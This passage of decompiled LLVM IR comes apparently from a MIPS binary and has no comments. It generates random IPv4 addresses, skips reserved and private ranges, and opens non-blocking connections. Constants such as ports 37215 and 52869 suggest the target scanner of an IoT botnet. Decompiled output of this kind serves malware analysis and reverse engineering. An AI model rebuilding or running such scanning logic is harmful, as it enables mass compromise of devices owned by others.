  %v7_402c34 = call i32 @function_404acc(i32 %v2_402c08, i32 ptrtoint ([3 x i8]* @global_var_4085f0.139 to i32), i32 %v3_402c2c)
  store i32 %v7_402c34, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v1_402c40, i32* %a0.global-to-local, align 4
  store i32 %v2_402c08, i32* @a1, align 4
  %v1_402c4c = load i32, i32* @s2, align 4
  %v2_402c4c = add i32 %v1_402c4c, 1
  store i32 %v2_402c4c, i32* @s2, align 4
  %v6_402c4c = call i32 @function_403ea8(i8* %v5_402c4c, i32 %v2_402c08)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_402c58 = load i32, i32* @s2, align 4
  %v1_402c58 = load i32, i32* @s3, align 4
  %v2_402c58 = icmp slt i32 %v0_402c58, %v1_402c58
  %v3_402c58 = zext i1 %v2_402c58 to i32
  store i32 %v3_402c58, i32* %v0.global-to-local, align 4
  %v3_402c5c = load i32, i32* @global_var_449c28.68, align 4
  store i32 %v2_402c60, i32* @s1, align 4
  store i32 %v1_402c40, i32* %s4.global-to-local, align 4
  br i1 %v2_402c58, label %dec_label_pc_402c08, label %dec_label_pc_402c68

dec_label_pc_402c68:                              ; preds = %dec_label_pc_402c08
  store i32 1024, i32* @a2, align 4
  store i32 %v2_402c60, i32* @a0, align 4
  %v6_402c74 = call i32 @function_403f6c(i32 %v2_402c60, i32 0, i32 1024)
  store i32 %v6_402c74, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_402c60, i32* %a0.global-to-local, align 4
  %v3_402c88 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_402c88, i32* @t9, align 4
  %v7_402c90 = bitcast i32* %stack_var_-1092 to i8*
  %v8_402c90 = call i32 @function_403f08(i8* %v7_402c90, i32 ptrtoint ([71 x i8]* @global_var_4085f4.140 to i32))
  store i32 %v8_402c90, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_402c60, i32* %a0.global-to-local, align 4
  store i32 %v1_402c40, i32* @a1, align 4
  %v6_402ca8 = call i32 @function_403ea8(i8* %v7_402c90, i32 %v1_402c40)
  store i32 %v6_402ca8, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_402c60, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_40863c.141 to i32), i32* @a1, align 4
  %v8_402cc4 = call i32 @function_403ea8(i8* %v7_402c90, i32 ptrtoint ([5 x i8]* @global_var_40863c.141 to i32))
  store i32 %v8_402cc4, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 3333, i32* @fp, align 4
  %v0_402cd8.pre = load i32, i32* @s6, align 4
  br label %dec_label_pc_402cd8

dec_label_pc_402cd8:                              ; preds = %dec_label_pc_402994, %dec_label_pc_402c68
  %v1_402cd8 = phi i32 [ %v8_402cc4, %dec_label_pc_402c68 ], [ 1, %dec_label_pc_402994 ]
  %v0_402ce8 = phi i32 [ %v0_402cd8.pre, %dec_label_pc_402c68 ], [ %v0_402990, %dec_label_pc_402994 ]
  %stack_var_-56.0 = phi i32 [ %v3_402a8c, %dec_label_pc_402c68 ], [ %tmp76, %dec_label_pc_402994 ]
  %stack_var_-52.0 = phi i32 [ %v2_402a44, %dec_label_pc_402c68 ], [ %tmp77, %dec_label_pc_402994 ]
  %v2_402cd8 = icmp eq i32 %v0_402ce8, %v1_402cd8
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_402cd8, label %dec_label_pc_402cdc, label %dec_label_pc_402ce8

dec_label_pc_402cdc:                              ; preds = %dec_label_pc_402cd8
  store i32 37215, i32* @fp, align 4
  br label %dec_label_pc_402ce8

dec_label_pc_402ce8:                              ; preds = %dec_label_pc_402cd8, %dec_label_pc_402cdc
  %v2_402ce8 = icmp eq i32 %v0_402ce8, 4
  br i1 %v2_402ce8, label %dec_label_pc_402cec, label %dec_label_pc_4031e8

dec_label_pc_402cec:                              ; preds = %dec_label_pc_402ce8
  %v3_402cf0 = load i32, i32* @global_var_449c08.14, align 4
  store i32 %v3_402cf0, i32* @t9, align 4
  store i32 12, i32* %a0.global-to-local, align 4
  %v2_402cf8 = call i32 @function_406140(i32 12)
  %v3_402cf8 = inttoptr i32 %v2_402cf8 to i16*
  store i32 %v2_402cf8, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 61, i32* %a0.global-to-local, align 4
  %v3_402d08 = load i32, i32* @global_var_4499d0.88, align 4
  %v1_402d10 = add i32 %v3_402d08, 9324
  store i32 %v1_402d10, i32* %s0.global-to-local, align 4
  %v2_402d18 = add i32 %v2_402cf8, 8
  %v3_402d18 = inttoptr i32 %v2_402d18 to i32*
  store i32 0, i32* %v3_402d18, align 4
  store i32 %v2_402cf8, i32* @global_var_449cd8.142, align 4
  %v3_402d20 = load i32, i32* @global_var_4499c8.2, align 4
  store i32 %v3_402d20, i32* %v1.global-to-local, align 4
  store i16 0, i16* %v3_402cf8, align 2
  store i32 %v2_402cf8, i32* @global_var_449cdc.143, align 4
  %v2_402d2c = add i32 %v2_402cf8, 2
  %v3_402d2c = inttoptr i32 %v2_402d2c to i8*
  store i8 0, i8* %v3_402d2c, align 1
  %v0_402d34 = load i32, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_402d34)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 31, i32* %a0.global-to-local, align 4
  %v0_402d50 = load i32, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_402d50)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 10, i32* %a0.global-to-local, align 4
  %v0_402d6c = load i32, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_402d6c)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_402d84

dec_label_pc_402d84:                              ; preds = %dec_label_pc_402958, %dec_label_pc_402cec
  %stack_var_-56.1 = phi i32 [ %tmp76, %dec_label_pc_402958 ], [ %stack_var_-56.0, %dec_label_pc_402cec ]
  %stack_var_-52.1 = phi i32 [ %tmp77, %dec_label_pc_402958 ], [ %stack_var_-52.0, %dec_label_pc_402cec ]
  store i32 52869, i32* @fp, align 4
  store i32 %v4_402960, i32* %s0.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_402d94

dec_label_pc_402d94:                              ; preds = %dec_label_pc_402d94.dec_label_pc_402d94_crit_edge, %dec_label_pc_402d84
  %v0_402d94 = phi i32 [ %v0_402d94.pre, %dec_label_pc_402d94.dec_label_pc_402d94_crit_edge ], [ %v2_402868, %dec_label_pc_402d84 ]
  %v1_402d94 = add i32 %v0_402d94, -32136
  %v2_402d94 = inttoptr i32 %v1_402d94 to i32*
  %v3_402d94 = load i32, i32* %v2_402d94, align 4
  call void @__pseudo_call(i32 %v3_402d94)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_402dac = load i32, i32* %s1.global-to-local, align 4
  %v1_402dac = add i32 %v0_402dac, 1
  store i32 %v1_402dac, i32* %s1.global-to-local, align 4
  %v2_402db0 = load i32, i32* %s0.global-to-local, align 4
  %v3_402db0 = add i32 %v2_402db0, 17
  %v4_402db0 = inttoptr i32 %v3_402db0 to i8*
  store i8 1, i8* %v4_402db0, align 1
  %v0_402db4 = load i32, i32* %s0.global-to-local, align 4
  %v1_402db4 = add i32 %v0_402db4, 1048
  store i32 %v1_402db4, i32* %s0.global-to-local, align 4
  %v0_402db8 = load i32, i32* %s1.global-to-local, align 4
  %v1_402db8 = load i32, i32* @s7, align 4
  %v2_402db8 = icmp slt i32 %v0_402db8, %v1_402db8
  %v3_402db8 = zext i1 %v2_402db8 to i32
  store i32 %v3_402db8, i32* %v0.global-to-local, align 4
  store i32 %v1_402db4, i32* %a0.global-to-local, align 4
  br i1 %v2_402db8, label %dec_label_pc_402d94.dec_label_pc_402d94_crit_edge, label %dec_label_pc_402dc0

dec_label_pc_402d94.dec_label_pc_402d94_crit_edge: ; preds = %dec_label_pc_402d94
  %v0_402d94.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_402d94

dec_label_pc_402dc0:                              ; preds = %dec_label_pc_402d94
  store i32 %v4_402960, i32* @s2, align 4
  br label %dec_label_pc_402dd0

dec_label_pc_402dd0:                              ; preds = %dec_label_pc_403bec, %dec_label_pc_402dc0
  %v0_402dd0 = phi i32 [ %v1_403bf0, %dec_label_pc_403bec ], [ %v4_402960, %dec_label_pc_402dc0 ]
  %stack_var_-64.0 = phi i32 [ %v1_403bf4, %dec_label_pc_403bec ], [ 0, %dec_label_pc_402dc0 ]
  %stack_var_-56.2 = phi i32 [ %stack_var_-56.8, %dec_label_pc_403bec ], [ %stack_var_-56.1, %dec_label_pc_402dc0 ]
  %stack_var_-52.2 = phi i32 [ %stack_var_-52.8, %dec_label_pc_403bec ], [ %stack_var_-52.1, %dec_label_pc_402dc0 ]
  %v1_402dd0 = add i32 %v0_402dd0, 16
  %v2_402dd0 = inttoptr i32 %v1_402dd0 to i8*
  %v3_402dd0 = load i8, i8* %v2_402dd0, align 1
  %v4_402dd0 = zext i8 %v3_402dd0 to i32
  store i32 %v4_402dd0, i32* %v1.global-to-local, align 4
  %v1_402dd8 = icmp ult i8 %v3_402dd0, 16
  %v1_402ddc = icmp eq i1 %v1_402dd8, false
  %v3_402ddc = mul nuw nsw i32 %v4_402dd0, 4
  store i32 %v3_402ddc, i32* %v0.global-to-local, align 4
  br i1 %v1_402ddc, label %dec_label_pc_403bec, label %dec_label_pc_402de0

dec_label_pc_402de0:                              ; preds = %dec_label_pc_402dd0
  %v0_402de4 = load i32, i32* %gp.global-to-local, align 4
  %v1_402de4 = add i32 %v0_402de4, -32740
  %v2_402de4 = inttoptr i32 %v1_402de4 to i32*
  %v3_402de4 = load i32, i32* %v2_402de4, align 4
  %v1_402dec = add i32 %v3_402de4, -27364
  store i32 %v1_402dec, i32* %v1.global-to-local, align 4
  %v2_402df0 = add i32 %v1_402dec, %v3_402ddc
  store i32 %v2_402df0, i32* %v0.global-to-local, align 4
  %v1_402df4 = inttoptr i32 %v2_402df0 to i32*
  %v2_402df4 = load i32, i32* %v1_402df4, align 4
  %v2_402dfc = add i32 %v2_402df4, %v0_402de4
  store i32 %v2_402dfc, i32* %v0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_402dfc)
  %v0_402e08 = load i32, i32* @s2, align 4
  %v1_402e08 = add i32 %v0_402e08, 17
  %v2_402e08 = inttoptr i32 %v1_402e08 to i8*
  %v3_402e08 = load i8, i8* %v2_402e08, align 1
  %v4_402e08 = zext i8 %v3_402e08 to i32
  store i32 %v4_402e08, i32* %v1.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v2_402e10 = icmp eq i8 %v3_402e08, 1
  store i32 %v0_402e08, i32* %a0.global-to-local, align 4
  br i1 %v2_402e10, label %dec_label_pc_402e14, label %dec_label_pc_402fc8

dec_label_pc_402e14:                              ; preds = %dec_label_pc_402de0
  %v0_402e18 = load i32, i32* %gp.global-to-local, align 4
  %v1_402e18 = add i32 %v0_402e18, -32136
  %v2_402e18 = inttoptr i32 %v1_402e18 to i32*
  %v3_402e18 = load i32, i32* %v2_402e18, align 4
  call void @__pseudo_call(i32 %v3_402e18)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_402e2c = load i32, i32* @fp, align 4
  %v1_402e2c = trunc i32 %v0_402e2c to i16
  %v2_402e2c = load i32, i32* @s2, align 4
  %v3_402e2c = add i32 %v2_402e2c, 4
  %v4_402e2c = inttoptr i32 %v3_402e2c to i16*
  store i16 %v1_402e2c, i16* %v4_402e2c, align 2
  br label %dec_label_pc_402e30

dec_label_pc_402e30:                              ; preds = %dec_label_pc_402f1c, %dec_label_pc_402f9c, %dec_label_pc_402f88, %dec_label_pc_402f80, %dec_label_pc_402f74, %dec_label_pc_402f68, %dec_label_pc_402f3c, %dec_label_pc_402ed8, %dec_label_pc_402ed0, %dec_label_pc_402e30, %dec_label_pc_402e14
  %v3_402e30 = load i32, i32* @global_var_449bc4.100, align 4
  store i32 %v3_402e30, i32* @t9, align 4
  store i32 -2139095040, i32* %s0.global-to-local, align 4
  %v1_402e38 = call i32 @function_401d34()
  %v2_402e38 = sext i32 %v1_402e38 to i64
  %v0_402e40 = load i32, i32* %s0.global-to-local, align 4
  %v1_402e40 = or i32 %v0_402e40, 32897
  store i32 %v1_402e40, i32* %s0.global-to-local, align 4
  %v4_402e44 = zext i32 %v1_402e40 to i64
  %v5_402e44 = mul nuw nsw i64 %v4_402e44, %v2_402e38
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_402e50 = load i32, i32* @global_var_449bc4.100, align 4
  store i32 %v3_402e50, i32* @t9, align 4
  %v1_402e586 = udiv i64 %v5_402e44, 549755813888
  %v1_402e58 = trunc i64 %v1_402e586 to i32
  store i32 %v1_402e58, i32* %v1.global-to-local, align 4
  %v3_402e5c = add i32 %v1_402e58, %v1_402e38
  store i32 %v3_402e5c, i32* %v0.global-to-local, align 4
  %v2_402e60 = urem i32 %v3_402e5c, 256
  store i32 %v2_402e60, i32* %s3.global-to-local, align 4
  %v3_402e60 = call i32 @function_401d34()
  %v4_402e60 = sext i32 %v3_402e60 to i64
  %v2_402e68 = load i32, i32* %s0.global-to-local, align 4
  %v4_402e68 = zext i32 %v2_402e68 to i64
  %v5_402e68 = mul nuw nsw i64 %v4_402e68, %v4_402e60
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_402e74 = load i32, i32* @global_var_449bc4.100, align 4
  store i32 %v3_402e74, i32* @t9, align 4
  %v1_402e7c8 = udiv i64 %v5_402e68, 549755813888
  %v1_402e7c = trunc i64 %v1_402e7c8 to i32
  store i32 %v1_402e7c, i32* %v1.global-to-local, align 4
  %v3_402e80 = add i32 %v1_402e7c, %v3_402e60
  store i32 %v3_402e80, i32* %v0.global-to-local, align 4
  %v2_402e84 = urem i32 %v3_402e80, 256
  store i32 %v2_402e84, i32* %s1.global-to-local, align 4
  %v3_402e84 = call i32 @function_401d34()
  %v4_402e84 = sext i32 %v3_402e84 to i64
  %v2_402e8c = load i32, i32* %s0.global-to-local, align 4
  %v4_402e8c = zext i32 %v2_402e8c to i64
  %v5_402e8c = mul nuw nsw i64 %v4_402e8c, %v4_402e84
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_402e98 = load i32, i32* @global_var_449bc4.100, align 4
  store i32 %v3_402e98, i32* @t9, align 4
  %v1_402ea010 = udiv i64 %v5_402e8c, 549755813888
  %v1_402ea0 = trunc i64 %v1_402ea010 to i32
  store i32 %v1_402ea0, i32* %v1.global-to-local, align 4
  %v3_402ea4 = add i32 %v1_402ea0, %v3_402e84
  store i32 %v3_402ea4, i32* %v0.global-to-local, align 4
  %v2_402ea8 = urem i32 %v3_402ea4, 256
  store i32 %v2_402ea8, i32* %s4.global-to-local, align 4
  %v3_402ea8 = call i32 @function_401d34()
  %v4_402ea8 = sext i32 %v3_402ea8 to i64
  %v2_402eb0 = load i32, i32* %s0.global-to-local, align 4
  %v4_402eb0 = zext i32 %v2_402eb0 to i64
  %v5_402eb0 = mul nuw nsw i64 %v4_402eb0, %v4_402ea8
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_402ebc12 = udiv i64 %v5_402eb0, 549755813888
  %v1_402ebc = trunc i64 %v1_402ebc12 to i32
  store i32 %v1_402ebc, i32* %s0.global-to-local, align 4
  %v3_402ec0 = add i32 %v1_402ebc, %v3_402ea8
  %v1_402ec4 = urem i32 %v3_402ec0, 256
  store i32 %v1_402ec4, i32* %a0.global-to-local, align 4
  store i32 127, i32* %v0.global-to-local, align 4
  %v0_402ecc = load i32, i32* %s3.global-to-local, align 4
  %v2_402ecc = icmp eq i32 %v0_402ecc, 127
  br i1 %v2_402ecc, label %dec_label_pc_402e30, label %dec_label_pc_402ed0

dec_label_pc_402ed0:                              ; preds = %dec_label_pc_402e30
  %v1_402ed4 = icmp eq i32 %v0_402ecc, 0
  store i32 10, i32* %v0.global-to-local, align 4
  br i1 %v1_402ed4, label %dec_label_pc_402e30, label %dec_label_pc_402ed8

dec_label_pc_402ed8:                              ; preds = %dec_label_pc_402ed0
  %v2_402edc = icmp eq i32 %v0_402ecc, 10
  store i32 192, i32* %v0.global-to-local, align 4
  br i1 %v2_402edc, label %dec_label_pc_402e30, label %dec_label_pc_402ee0

dec_label_pc_402ee0:                              ; preds = %dec_label_pc_402ed8
  %v2_402ee4 = icmp eq i32 %v0_402ecc, 192
  store i32 168, i32* %v0.global-to-local, align 4
  br i1 %v2_402ee4, label %dec_label_pc_402f3c, label %dec_label_pc_402ee8

dec_label_pc_402ee8:                              ; preds = %dec_label_pc_402ee0
  %v2_402ef0 = icmp eq i32 %v0_402ecc, 172
  store i32 100, i32* %v0.global-to-local, align 4
  br i1 %v2_402ef0, label %dec_label_pc_402ef4, label %dec_label_pc_402f0c

dec_label_pc_402ef4:                              ; preds = %dec_label_pc_402ee8
  %v0_402ef8 = load i32, i32* %s1.global-to-local, align 4
  %v1_402ef8 = icmp ult i32 %v0_402ef8, 16
  %v3_402efc = icmp ult i32 %v0_402ef8, 32
  %v4_402efc = zext i1 %v3_402efc to i32
  store i32 %v4_402efc, i32* %v0.global-to-local, align 4
  br i1 %v1_402ef8, label %dec_label_pc_402fac, label %dec_label_pc_402f0c

dec_label_pc_402f0c:                              ; preds = %dec_label_pc_402ef4, %dec_label_pc_402ee8
  %v1_402f0c = phi i32 [ %v4_402efc, %dec_label_pc_402ef4 ], [ 100, %dec_label_pc_402ee8 ]
  %v2_402f0c = icmp eq i32 %v0_402ecc, %v1_402f0c
  store i32 169, i32* %v0.global-to-local, align 4
  br i1 %v2_402f0c, label %dec_label_pc_402f10, label %dec_label_pc_402f30

dec_label_pc_402f10:                              ; preds = %dec_label_pc_402f0c
  %v0_402f14 = load i32, i32* %s1.global-to-local, align 4
  %v1_402f14 = icmp ult i32 %v0_402f14, 64
  %v3_402f18 = icmp ult i32 %v0_402f14, 127
  %v4_402f18 = zext i1 %v3_402f18 to i32
  store i32 %v4_402f18, i32* %v0.global-to-local, align 4
  br i1 %v1_402f14, label %dec_label_pc_402fac, label %dec_label_pc_402f1c

dec_label_pc_402f1c:                              ; preds = %dec_label_pc_402f10
  %v1_402f20 = icmp eq i1 %v3_402f18, false
  %v3_402f20 = mul i32 %v0_402f14, 65536
  store i32 %v3_402f20, i32* %v1.global-to-local, align 4
  br i1 %v1_402f20, label %dec_label_pc_402f24, label %dec_label_pc_402e30

dec_label_pc_402f24:                              ; preds = %dec_label_pc_402f1c
  %v1_402f2c = mul i32 %v0_402ecc, 16777216
  store i32 %v1_402f2c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402f30

dec_label_pc_402f30:                              ; preds = %dec_label_pc_402f0c, %dec_label_pc_402f24
  %v1_402f30 = phi i32 [ 169, %dec_label_pc_402f0c ], [ %v1_402f2c, %dec_label_pc_402f24 ]
  %v2_402f30 = icmp eq i32 %v0_402ecc, %v1_402f30
  store i32 198, i32* %v0.global-to-local, align 4
  br i1 %v2_402f30, label %dec_label_pc_402f34, label %dec_label_pc_402f4c

dec_label_pc_402f34:                              ; preds = %dec_label_pc_402f30
  store i32 255, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402f3c

dec_label_pc_402f3c:                              ; preds = %dec_label_pc_402ee0, %dec_label_pc_402f34
  %v1_402f3c = phi i32 [ 168, %dec_label_pc_402ee0 ], [ 255, %dec_label_pc_402f34 ]
  %v0_402f3c = load i32, i32* %s1.global-to-local, align 4
  %v2_402f3c = icmp eq i32 %v0_402f3c, %v1_402f3c
  %v4_402f3c = mul i32 %v0_402f3c, 65536
  store i32 %v4_402f3c, i32* %v1.global-to-local, align 4
  br i1 %v2_402f3c, label %dec_label_pc_402e30, label %dec_label_pc_402f40

dec_label_pc_402f40:                              ; preds = %dec_label_pc_402f3c
  %v1_402f48 = mul i32 %v0_402ecc, 16777216
  store i32 %v1_402f48, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402f4c

dec_label_pc_402f4c:                              ; preds = %dec_label_pc_402f30, %dec_label_pc_402f40
  %v1_402f4c = phi i32 [ 198, %dec_label_pc_402f30 ], [ %v1_402f48, %dec_label_pc_402f40 ]
  %v2_402f4c = icmp eq i32 %v0_402ecc, %v1_402f4c
  %v4_402f4c = icmp ult i32 %v0_402ecc, 224
  %v5_402f4c = zext i1 %v4_402f4c to i32
  store i32 %v5_402f4c, i32* %v0.global-to-local, align 4
  br i1 %v2_402f4c, label %dec_label_pc_402f50, label %dec_label_pc_402f68

dec_label_pc_402f50:                              ; preds = %dec_label_pc_402f4c
  %v0_402f54 = load i32, i32* %s1.global-to-local, align 4
  %v1_402f54 = icmp ult i32 %v0_402f54, 18
  %v3_402f58 = icmp ult i32 %v0_402f54, 20
  %v4_402f58 = zext i1 %v3_402f58 to i32
  store i32 %v4_402f58, i32* %v0.global-to-local, align 4
  br i1 %v1_402f54, label %dec_label_pc_402fac, label %dec_label_pc_402f68

dec_label_pc_402f68:                              ; preds = %dec_label_pc_402f50, %dec_label_pc_402f4c
  %v0_402f68 = phi i32 [ %v4_402f58, %dec_label_pc_402f50 ], [ %v5_402f4c, %dec_label_pc_402f4c ]
  %v1_402f68 = icmp eq i32 %v0_402f68, 0
  store i32 106, i32* %v0.global-to-local, align 4
  br i1 %v1_402f68, label %dec_label_pc_402e30, label %dec_label_pc_402f6c

dec_label_pc_402f6c:                              ; preds = %dec_label_pc_402f68
  %v2_402f70 = icmp eq i32 %v0_402ecc, 106
  store i32 6, i32* %v0.global-to-local, align 4
  br i1 %v2_402f70, label %dec_label_pc_402f74, label %dec_label_pc_402f9c

dec_label_pc_402f74:                              ; preds = %dec_label_pc_402f6c
  %v0_402f7c = load i32, i32* %s1.global-to-local, align 4
  %v2_402f7c = icmp eq i32 %v0_402f7c, 185
  store i32 187, i32* %v0.global-to-local, align 4
  br i1 %v2_402f7c, label %dec_label_pc_402e30, label %dec_label_pc_402f80

dec_label_pc_402f80:                              ; preds = %dec_label_pc_402f74
  %v2_402f84 = icmp eq i32 %v0_402f7c, 187
  store i32 184, i32* %v0.global-to-local, align 4
  br i1 %v2_402f84, label %dec_label_pc_402e30, label %dec_label_pc_402f88

dec_label_pc_402f88:                              ; preds = %dec_label_pc_402f80
  %v2_402f8c = icmp eq i32 %v0_402f7c, 184
  store i32 186, i32* %v0.global-to-local, align 4
  br i1 %v2_402f8c, label %dec_label_pc_402e30, label %dec_label_pc_402f9c

dec_label_pc_402f9c:                              ; preds = %dec_label_pc_402f88, %dec_label_pc_402f6c
  %v1_402f9c = phi i32 [ 186, %dec_label_pc_402f88 ], [ 6, %dec_label_pc_402f6c ]
  %v2_402f9c = icmp eq i32 %v0_402ecc, %v1_402f9c
  store i32 11, i32* %v0.global-to-local, align 4
  %v2_402fa4 = icmp eq i32 %v0_402ecc, 11
  %or.cond = or i1 %v2_402fa4, %v2_402f9c
  br i1 %or.cond, label %dec_label_pc_402e30, label %dec_label_pc_402f9c.dec_label_pc_402fac_crit_edge

dec_label_pc_402f9c.dec_label_pc_402fac_crit_edge: ; preds = %dec_label_pc_402f9c
  %v0_402fac.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_402fac

dec_label_pc_402fac:                              ; preds = %dec_label_pc_402f50, %dec_label_pc_402f10, %dec_label_pc_402ef4, %dec_label_pc_402f9c.dec_label_pc_402fac_crit_edge
  %v0_402ecc109 = phi i32 [ %v0_402ecc, %dec_label_pc_402f9c.dec_label_pc_402fac_crit_edge ], [ 172, %dec_label_pc_402ef4 ], [ %v0_402ecc, %dec_label_pc_402f10 ], [ %v0_402ecc, %dec_label_pc_402f50 ]
  %v0_402fac = phi i32 [ %v0_402fac.pre, %dec_label_pc_402f9c.dec_label_pc_402fac_crit_edge ], [ %v0_402ef8, %dec_label_pc_402ef4 ], [ %v0_402f14, %dec_label_pc_402f10 ], [ %v0_402f54, %dec_label_pc_402f50 ]
  %v1_402fac = mul i32 %v0_402fac, 65536
  %v1_402fb0 = mul i32 %v0_402ecc109, 16777216
  %v2_402fb4 = or i32 %v1_402fb0, %v1_402ec4
  %v2_402fb8 = or i32 %v2_402fb4, %v1_402fac
  store i32 %v2_402fb8, i32* %v0.global-to-local, align 4
  %v0_402fbc = load i32, i32* %s4.global-to-local, align 4
  %v1_402fbc = mul i32 %v0_402fbc, 256
  %v2_402fc0 = or i32 %v1_402fbc, %v2_402fb8
  store i32 %v2_402fc0, i32* %v1.global-to-local, align 4
  %v1_402fc4 = load i32, i32* @s2, align 4
  %v2_402fc4 = inttoptr i32 %v1_402fc4 to i32*
  store i32 %v2_402fc0, i32* %v2_402fc4, align 4
  %v0_402fc8.pre = load i32, i32* @s2, align 4
  br label %dec_label_pc_402fc8

dec_label_pc_402fc8:                              ; preds = %dec_label_pc_402de0, %dec_label_pc_402fac
  %v0_402fc8 = phi i32 [ %v0_402e08, %dec_label_pc_402de0 ], [ %v0_402fc8.pre, %dec_label_pc_402fac ]
  %v1_402fc8 = add i32 %v0_402fc8, 4
  %v2_402fc8 = inttoptr i32 %v1_402fc8 to i16*
  %v3_402fc8 = load i16, i16* %v2_402fc8, align 2
  %v4_402fc8 = zext i16 %v3_402fc8 to i32
  store i32 %v4_402fc8, i32* %v1.global-to-local, align 4
  %v1_402fcc = inttoptr i32 %v0_402fc8 to i32*
  %v2_402fcc = load i32, i32* %v1_402fcc, align 4
  store i32 %v2_402fcc, i32* %a0.global-to-local, align 4
  %v0_402fd0 = load i32, i32* %gp.global-to-local, align 4
  %v1_402fd0 = add i32 %v0_402fd0, -32188
  %v2_402fd0 = inttoptr i32 %v1_402fd0 to i32*
  %v3_402fd0 = load i32, i32* %v2_402fd0, align 4
  store i32 2, i32* %v0.global-to-local, align 4
  store i32 2, i32* %stack_var_-2312, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402fd0)
  store i32 -1, i32* %s1.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_402ffc = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_402ffc, i32* @s0, align 4
  %v2_403000 = icmp eq i32 %v0_402ffc, -1
  %v4_403000 = load i32, i32* @s2, align 4
  %v5_403000 = add i32 %v4_403000, 8
  %v6_403000 = inttoptr i32 %v5_403000 to i32*
  store i32 %v0_402ffc, i32* %v6_403000, align 4
  br i1 %v2_403000, label %dec_label_pc_403bec, label %dec_label_pc_403004

dec_label_pc_403004:                              ; preds = %dec_label_pc_402fc8
  %v3_403008 = load i32, i32* @global_var_449a74.80, align 4
  store i32 %v3_403008, i32* @t9, align 4
  store i32 3, i32* @a1, align 4
  %v1_403014 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_403014, i32* @a0, align 4
  %v2_403014 = call i32 @function_404bc0()
  store i32 %v2_403014, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403020 = load i32, i32* @s0, align 4
  store i32 %v0_403020, i32* @a0, align 4
  %v3_403024 = load i32, i32* @global_var_449a74.80, align 4
  store i32 %v3_403024, i32* @t9, align 4
  store i32 4, i32* @a1, align 4
  %v1_40302c = call i32 @function_404bc0()
  store i32 %v1_40302c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403038 = load i32, i32* @s2, align 4
  %v1_403038 = add i32 %v0_403038, 8
  %v2_403038 = inttoptr i32 %v1_403038 to i32*
  %v3_403038 = load i32, i32* %v2_403038, align 4
  store i32 %v3_403038, i32* %a0.global-to-local, align 4
  %v3_40303c = load i32, i32* @global_var_449c60.86, align 4
  store i32 %v3_40303c, i32* @t9, align 4
  store i32 16, i32* @a2, align 4
  %v4_403044 = bitcast i32* %stack_var_-2312 to %sockaddr*
  %v5_403044 = call i32 @function_405bf0(i32 %v3_403038, %sockaddr* %v4_403044)
  store i32 %v5_403044, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_403050 = load i32, i32* %s1.global-to-local, align 4
  %v2_403050 = icmp eq i32 %v5_403044, %v1_403050
  %v3_403050 = load i32, i32* @s2, align 4
  store i32 %v3_403050, i32* %a0.global-to-local, align 4
  br i1 %v2_403050, label %dec_label_pc_403054, label %dec_label_pc_403080

dec_label_pc_403054:                              ; preds = %dec_label_pc_403004
  %v3_403058 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_403058, i32* @t9, align 4
  %v1_403060 = call i32 @function_4056e0()
  store i32 %v1_403060, i32* %v0.global-to-local, align 4
  %v1_403068 = inttoptr i32 %v1_403060 to i32*
  %v2_403068 = load i32, i32* %v1_403068, align 4
  store i32 %v2_403068, i32* %v1.global-to-local, align 4
  store i32 150, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v2_403074 = icmp eq i32 %v2_403068, 150
  br i1 %v2_403074, label %dec_label_pc_403078, label %dec_label_pc_403ba4

dec_label_pc_403078:                              ; preds = %dec_label_pc_403054
  %v0_40307c = load i32, i32* @s2, align 4
  store i32 %v0_40307c, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403080

dec_label_pc_403080:                              ; preds = %dec_label_pc_403004, %dec_label_pc_403078
  %v2_403088 = ptrtoint i32* %stack_var_-2244 to i32
  store i32 %v2_403088, i32* %v0.global-to-local, align 4
